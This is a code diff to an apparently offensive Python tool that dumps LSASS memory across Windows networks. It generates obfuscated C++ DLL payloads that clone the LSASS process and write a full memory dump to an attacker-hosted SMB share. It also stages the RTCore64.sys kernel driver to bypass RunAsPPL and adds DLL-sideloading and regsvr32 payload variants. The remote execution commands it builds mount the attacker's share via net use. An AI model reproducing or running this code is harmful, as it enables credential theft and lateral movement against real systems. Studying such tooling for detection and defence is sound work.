+    dll_payload += '    PROCESSENTRY32 %s = {};\n' % (processEntry)
+    dll_payload += '    %s.dwSize = sizeof(PROCESSENTRY32);\n' % (processEntry)
+    dll_payload += '    LPCWSTR %s = L"";\n' % (processName)
+    dll_payload += '    string %s = "l";\n' % (l)
+    dll_payload += '    string %s = "s";\n' % (s)
+    dll_payload += '    string %s = "a";\n' % (a)
+    dll_payload += '    string %s = "e";\n' % (e)
+    dll_payload += '    string %s = "x";\n' % (x)
+    dll_payload += '    string %s = ".";\n' % (period)
+    dll_payload += '    string %s = %s + %s + %s +%s + %s + %s + %s + %s + %s;\n' % (lsass_processname, l, s, a, s, s, period, e, x, e)
+    dll_payload += '    std::wstring %s(%s.begin(), %s.end());\n' % (processnamesd, lsass_processname, lsass_processname)
+    dll_payload += '    const wchar_t* %s = %s.c_str();\n' % (szName, processnamesd)
+    dll_payload += '    if (Process32First(%s, &%s)) {\n' % (snapshot, processEntry)
+    dll_payload += '        while (_wcsicmp(%s, %s) != 0) {\n' % (processName, szName)
+    dll_payload += '            Process32Next(%s, &%s);\n' % (snapshot, processEntry)
+    dll_payload += '            %s = %s(%s.szExeFile);\n' % (processName, convertCharArrayToLPCWSTR, processEntry)
+    dll_payload += '            %s = %s.th32ProcessID;\n' % (lsassPID, processEntry)
+    dll_payload += '        }\n'
+    dll_payload += '    }\n'
+    dll_payload += ''
+    dll_payload += '    %s = OpenProcess(PROCESS_ALL_ACCESS, 0, %s);\n' % (lsassHandle, lsassPID)
+    dll_payload += ''
+    # should go drive_letter:\\\\hostname-ip.dmp adding the -ip part would be too much work so im not doing it soz
+    dll_payload += '    TCHAR %s[UNCLEN+1];\n' % (compname)
+    dll_payload += '    DWORD %s=UNCLEN+1;\n' % (compname_len)
+    dll_payload += '    GetComputerName((TCHAR*)%s,&%s);\n' % (compname, compname_len)
+
+    dll_payload += '    char %s[200];\n' % (res)
+    dll_payload += '    char *%s = "%s:\\\\";\n' % (one, drive_letter)
+    dll_payload += '    char *%s = ".dmp";\n' % (twp)
+    dll_payload += '    strcpy(%s, %s);\n' % (res, one)
+    dll_payload += '    strcat(%s, %s);\n' % (res, compname)
+    dll_payload += '    strcat(%s, %s);\n' % (res, twp)
+
+    dll_payload += '    HANDLE %s = CreateFile(%s, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n' % (outFile, res)
+    dll_payload += ''
+    dll_payload += '    %s();\n' % (load_RtlCreateProcessReflection)
+    dll_payload += '    t_refl_args %s = { 0 };\n' % (args)
+    dll_payload += '    %s.orig_hndl = %s;\n' % (args, lsassHandle)
+    dll_payload += '    DWORD %s = %s(&%s);\n' % (ret, refl_creator, args)
+    dll_payload += ''
+
+    dll_payload += '    DWORD %s = MiniDumpWriteDump(%s.returned_hndl, %s.returned_pid, %s, MiniDumpWithFullMemory, NULL,  NULL, NULL);\n' % (retd, args, args, outFile)
+    dll_payload += ''
+    dll_payload += '    CloseHandle(%s);\n' % (outFile)
+    dll_payload += '    TerminateProcess(%s.returned_hndl, 0);\n' % (args)
+    dll_payload += '    CloseHandle(%s.returned_hndl);\n' % (args)
+    dll_payload += '\n'
+    dll_payload += '}\n'
+    dll_payload += ''
+    dll_payload += 'int main(){\n'
+    dll_payload += '    return 1;\n'
+    dll_payload += '}\n'
+
+    # share_name, payload_name, addresses_array, drive_letter
+    with open('/var/tmp/{}/pl.cpp'.format(share_name), 'w') as f:
+        f.write(dll_payload)
+        f.close()
+
+    if runasppl:
+        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, runasppldllname))
+        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
+        with open('/var/tmp/{}/cleanup.bat'.format(share_name), 'w') as f:
+            f.write('net stop RTCore64\n')
+            f.write('sc delete RTCore64\n')
+            f.write(r'del C:\Windows\Temp\RTCore64.sys')
+            f.close()
+
+        os.system('sudo chmod uog+rwx /var/tmp/{}/{}.dll'.format(share_name, runasppldllname))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/RTCore64.sys'.format(share_name))
+        os.system('sudo chmod uog+rwx /var/tmp/{}/cleanup.bat'.format(share_name))
+
+    # copy calc.exe to our smb share
+    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
+    # allow anyone to run calc.exe
+    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
+
+    os.system('sudo x86_64-w64-mingw32-g++ /var/tmp/{}/pl.cpp -fpermissive -Wwrite-strings -w -I {}/src/ -static -shared -o /var/tmp/{}/WindowsCodecs.dll -ldbghelp -lpsapi'.format(share_name, cwd, share_name, payload_name))
+    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
+
 def setup_share():
     if options.sharename is None:
         share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
@@ -2510,7 +3062,7 @@ if __name__ == '__main__':
     parser.add_argument('-threads', action='store', type=int, default=5, help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='smbexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
-    parser.add_argument('-payload', '-p', action='store', default='exe-mdwdpss', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd', 'exe-rtlcp'], help='Choose a payload type')
+    parser.add_argument('-payload', '-p', action='store', default='exe-mdwdpss', choices=['msbuild', 'regsvr32-mdwdpss', 'regsvr32-mdwd', 'dllsideload-mdwdpss', 'dllsideload-mdwd', 'exe-mdwdpss', 'exe-mdwd', 'exe-rtlcp', 'regsvr32-rtlcp', 'dllsideload-rtlcp'], help='Choose a payload type')
     parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL Only compatable with the exe-rtlcp payload(WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
@@ -2587,10 +3139,10 @@ if __name__ == '__main__':
         printnlog('{}[!]{} RunAsPPL Bypass only works with the SMBExec method'.format(color_RED, color_reset))
         sys.exit(0)
 
-    runaspplpayloads = ['msbuild', 'exe-rtlcp']
+    runaspplpayloads = ['msbuild', 'exe-rtlcp', 'dllsideload-rtlcp']
 
     if options.runasppl and options.payload not in runaspplpayloads:  # check to see if the user is trying to run the runasppl bypass with a payload other than msbuild
-        printnlog('{}[!]{} RunAsPPL Bypass only works with the MsBuild or exe-rtlcp payloads'.format(color_RED, color_reset))
+        printnlog('{}[!]{} RunAsPPL Bypass only works with the msbuild, exe-rtlcp, and dllsideload-rtlcp payloads'.format(color_RED, color_reset))
         sys.exit(0)
 
     if options.runasppl:
@@ -2795,22 +3347,26 @@ if __name__ == '__main__':
             addresses_file = gen_payload_regsvr32_mdwd(share_name, payload_name, addresses)
         elif options.payload == 'exe-rtlcp':
             gen_payload_exe_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
+        elif options.payload == 'regsvr32-rtlcp':
+            addresses_file = gen_payload_regsvr32_rtlcp(share_name, payload_name, drive_letter, options.runasppl)
+        elif options.payload == 'dllsideload-rtlcp':
+            gen_payload_dllsideload_rtlcp(share_name, drive_letter, options.runasppl)
 
         if not options.oe:
             printnlog('\n[This is where the fun begins]\n{} Executing {} via {}\n'.format(green_plus, options.payload, options.method))
 
+        cleanup = ''
+        if options.runasppl: # append the cleanup command
+            cleanup += r'&& {}:\cleanup.bat '.format(drive_letter)
+
         if options.payload == 'msbuild':
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
-        elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd':
-            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
+        elif options.payload == 'regsvr32-mdwdpss' or options.payload == 'regsvr32-mdwd' or options.payload == 'regsvr32-rtlcp':
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, cleanup, drive_letter)
         elif options.payload == 'exe-mdwdpss' or options.payload == 'exe-mdwd' or options.payload == 'exe-rtlcp':
-            cleanup = ''
-            if options.runasppl:
-                cleanup += r'&& {}:\cleanup.bat '.format(drive_letter)
             command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe {}&& net use {}: /delete /yes'.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, cleanup, drive_letter)
-
-        elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd':
-            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
+        elif options.payload == 'dllsideload-mdwdpss' or options.payload == 'dllsideload-mdwd' or options.payload == 'dllsideload-rtlcp':
+            command = r'net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe {}&& net use {}: /delete /yes '.format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, cleanup, drive_letter)
 
         printnlog(command)
         printnlog('')
